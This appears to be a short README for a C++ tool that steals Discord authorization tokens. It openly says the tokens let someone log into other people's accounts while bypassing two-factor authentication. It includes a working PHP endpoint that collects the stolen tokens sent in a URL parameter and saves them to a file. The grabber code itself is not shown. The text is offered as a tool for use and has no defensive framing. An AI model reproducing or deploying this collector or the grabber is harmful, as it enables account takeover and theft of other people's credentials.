# Discord Token Grabber
A Discord token grabber written in C++.

This is a "token" or authorization key finder for the platform "Discord".

You can use "tokens" to login to other people's accounts with the authorization key bypassing 2fa.

# Web
The web code is very basic and can be accessed by anyone so I would recommend changing it.
```php
<?php

$file = fopen("tokens.txt", "w");
if(isset($_GET["t"])){
	fwrite($file, $_GET["t"]);
}

?>
```
